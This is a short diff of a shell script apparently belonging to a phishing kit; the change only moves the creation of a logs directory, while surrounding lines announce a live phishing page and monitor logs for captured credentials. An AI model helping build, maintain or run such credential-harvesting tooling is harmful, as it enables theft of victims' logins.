@@ -36,6 +36,9 @@ check_directories() {
         echo -e "\nTemplates directory not found! Please make sure the templates directory exists."
         exit 1
     fi
+    if [ ! -d "logs" ]; then
+        mkdir logs
+    fi
 }
 
 # Function to start the phishing server
@@ -53,9 +56,6 @@ start_server() {
 
     echo -e "\nPhishing page is live at: \033[1;34mhttp://127.0.0.1:$port\033[0m"
     echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"
-
-    # Create the log directory if it doesn't exist
-    mkdir -p logs
 
     # Monitor the PHP server logs for captured credentials
     if [ -f logs/$template.log ]; then
